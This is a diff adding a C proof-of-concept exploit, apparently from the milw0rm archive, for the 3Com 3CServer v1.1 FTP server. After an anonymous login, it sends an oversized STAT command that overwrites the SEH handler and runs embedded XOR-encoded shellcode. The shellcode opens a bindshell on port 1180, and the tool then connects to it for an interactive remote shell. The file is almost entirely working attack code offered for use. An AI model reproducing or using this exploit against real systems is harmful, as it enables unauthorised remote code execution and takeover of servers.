@@ -1,0 +1,241 @@
+/*
+
+subject:	Proof of Concept exploit for 3CServer v1.1 FTP server
+vendor:		3Com, http://support.3com.com/software/utilities_for_windows_32_bit.htm
+`date`:		Mon Feb  7 18:10:01     2005
+notes:		universal offset, SEH ptr overwriting with variation
+author:		mandragore, mandragore@turingtest@gmail.com
+
+*/
+
+#include <stdio.h>
+#include <strings.h>
+#include <signal.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define NORM  "\033[00;00m"
+#define GREEN "\033[01;32m"
+#define YELL  "\033[01;33m"
+#define RED   "\033[01;31m"
+
+#define BANNER GREEN "[%%] " YELL "mandragore's sploit v1.0 for " RED "3CServer v1.1.007" NORM
+
+#define fatal(x) { perror(x); exit(1); }
+
+#define default_port 21
+#define default_user "anonymous"
+#define default_pass "weak@3com.com"
+
+#define GPA 0x0045b968
+#define LLA 0x0045b964
+
+#define offset 0x418A19	// call eax
+
+unsigned char bsh[]={
+// 198 bytes, iat's gpa at 0x1a, iat's lla at 0x2b, port at 0x46 (1180), key 0xde
+0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xB0,0x80,0x36,0xDE,0x46,0xE2,0xFA,
+0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0x57,0xD7,0x60,0xDE,0xFE,0x9E,0xDE,0xB6,0xED,
+0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,0x9E,0xDE,0x49,
+0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0xB4,0x90,0x89,0x21,0xC8,0x21,0x0E,
+0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xDA,0x42,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0xB4,0xDC,
+0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,0x8D,0xB4,0xD3,0x89,0x21,0xC8,0x21,0x0E,0xB4,
+0xDE,0x8A,0x8D,0xB4,0xDF,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,
+0x87,0x55,0x22,0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,
+0xDF,0x8E,0x8E,0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,
+0xDE,0xDE,0x9D,0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,
+0xDE,0x18,0xD9,0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,
+0x75,0x75,0xBA,0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,
+0xAE,0xD6,0x21,0xC8,0x21,0x0E
+};
+
+char verbose=0;
+
+static void start(void) __attribute__ ((constructor));
+
+void start() {
+	int gpa=GPA^0xdededede, lla=LLA^0xdededede;
+	memcpy(bsh+0x1a,&gpa,4);
+	memcpy(bsh+0x2b,&lla,4);
+}
+
+int readcrap(int s) {
+	struct timeval tv;
+	fd_set fds;
+	int ret;
+	char buff[1024];
+
+	FD_ZERO(&fds);
+	FD_SET(s,&fds);
+
+	bzero(buff,sizeof(buff));
+
+	while (1) {
+		tv.tv_sec=1;
+		tv.tv_usec=0;
+		if ( ret=select(s+1, &fds, NULL, NULL, (struct timeval *)&tv) < 0 )
+			break;
+		if (FD_ISSET(s,&fds)) {
+			// something to read
+			if ( read(s,buff,sizeof(buff),0) < 1 )
+				break;
+		} else {
+			// timeout
+			return 1;
+		}
+	}
+
+	return 0; // something went bad
+}
+
+void usage(char *argv0) {
+	int i;
+
+	printf("%s -d <host/ip> [opts]\n\n",argv0);
+
+	printf("Options:\n");
+	printf(" -h undocumented\n");
+	printf(" -u user [default: " default_user "]\n");
+	printf(" -p pass [default: " default_pass "]\n");
+	printf(" -P <port> for the shellcode [default: 1180]\n");
+
+	exit(1);
+}
+
+void shell(int s) {
+	char buff[4096];
+	int retval;
+	fd_set fds;
+
+	printf("[+] connected!\n\n");
+
+	for (;;) {
+		FD_ZERO(&fds);
+		FD_SET(0,&fds);
+		FD_SET(s,&fds);
+
+        if (select(s+1, &fds, NULL, NULL, NULL) < 0)
+			fatal("[-] shell.select()");
+
+		if (FD_ISSET(0,&fds)) {
+			if ((retval = read(1,buff,4096)) < 1)
+				fatal("[-] shell.recv(stdin)");
+			send(s,buff,retval,0);
+		}
+
+		if (FD_ISSET(s,&fds)) {
+			if ((retval = recv(s,buff,4096,0)) < 1)
+				fatal("[-] shell.recv(socket)");
+			write(1,buff,retval);
+		}
+	}
+}
+
+int main(int argc, char **argv, char **env) {
+	struct sockaddr_in sin;
+	struct hostent *he;
+	char *host; int port=default_port;
+	char *Host; int Port=1180; char bindopt=1;
+	int i,s;
+	char *buff, *jmpback="\xe9\x35\xff\xff\xff";
+	char *user=default_user; char *pass=default_pass;
+
+	printf(BANNER "\n");
+
+	if (argc==1)
+		usage(argv[0]);
+
+	for (i=1;i<argc;i+=2) {
+		if (strlen(argv[i]) != 2)
+			usage(argv[0]);
+
+		switch(argv[i][1]) {
+			case 'd':
+				host=argv[i+1];
+				break;
+			case 'u':
+				user=argv[i+1];
+				break;
+			case 'p':
+				pass=argv[i+1];
+				break;
+			case 'P':
+				Port=atoi(argv[i+1])?:1180;
+				Port=Port ^ 0xdede;
+				Port=(Port & 0xff) << 8 | Port >>8;
+				memcpy(bsh+0x46,&Port,2);
+				Port=Port ^ 0xdede;
+				Port=(Port & 0xff) << 8 | Port >>8;
+				break;
+			case 'v':
+				verbose++; i--;
+				break;
+			case 'h':
+				usage(argv[0]);
+			default:
+				usage(argv[0]);
+			}
+	}
+
+	if (verbose)
+		printf("verbose!\n");
+
+	if ((he=gethostbyname(host))==NULL)
+		fatal("[-] gethostbyname()");
+
+	sin.sin_family = 2;
+	sin.sin_addr = *((struct in_addr *)he->h_addr_list[0]);
+	sin.sin_port = htons(port);
+
+	printf("[.] launching attack on %s:%d..\n",inet_ntoa(*((struct in_addr *)he->h_addr_list[0])),port);
+	printf("[.] will try to put a bindshell on port %d.\n",Port);
+
+// --------------------  core
+
+	s=socket(2,1,6);
+
+	if (connect(s,(struct sockaddr *)&sin,16)!=0)
+		fatal("[-] connect()");
+
+	printf("[+] connected, sending exploit\n");
+
+	buff=(char *)malloc(4096);
+	bzero(buff,4096);
+
+	readcrap(s);
+	sprintf(buff,"USER %s\r\n",user);
+	send(s,buff,strlen(buff),0);
+	readcrap(s);
+	sprintf(buff,"PASS %s\r\n",pass);
+	send(s,buff,strlen(buff),0);
+	readcrap(s);
+
+	bzero(buff,sizeof(buff));
+	strcpy(buff,"STAT ");
+	memset(buff+5,0x41,2000);
+	memcpy(buff+5+0x571-strlen(bsh),&bsh,strlen(bsh));
+	memcpy(buff+5+0x571,jmpback,strlen(jmpback));
+	i=offset;
+	memcpy(buff+5+0x5d9,&i,4);
+
+	send(s,buff,strlen(buff),0);
+	readcrap(s);
+
+	free(buff);
+
+	close(s);
+
+// --------------------  end of core
+
+	sin.sin_port = htons(Port);
+	sleep(1);
+	s=socket(2,1,6);
+	if (connect(s,(struct sockaddr *)&sin,16)!=0)
+		fatal("[-] exploit most likely failed");
+	shell(s);
+
+	exit(0);
+}
+
+// milw0rm.com [2005-02-07]
